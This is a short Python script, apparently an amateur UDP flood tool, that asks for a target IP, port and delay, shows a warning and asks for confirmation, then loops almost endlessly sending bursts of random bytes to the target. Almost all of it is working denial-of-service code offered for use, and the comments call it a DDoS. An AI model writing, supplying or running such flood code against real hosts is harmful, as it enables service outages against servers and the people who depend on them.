#Modules
import socket, random, time


#Socket setup
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #Input Varibles
ip = input("Enter Target IP: ")
port = int(input("Enter target Port: "))
sleep = int(float(input("Sleep: ")))

#Confirmation stuff
print("-----------------------------------")
print("WARNING!  You are about to potentially bring down a server or harm one, make sure you know what you are doing before proceeding.")
confirmation = input("Attacking IP " + ip + "... Proceed? (y/n) ")
print("-----------------------------------")


if confirmation == 'y':
    #Establishes a connection with the target
    print("Press ctrl + c to kill the Program if desired...")
    s.connect((ip, port))
    
    #DDoS
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Packets sent: {i}", end='\r')
        time.sleep(sleep)


# Stops the program if response is equal to n
else:
    print("You may now safely close this window...")
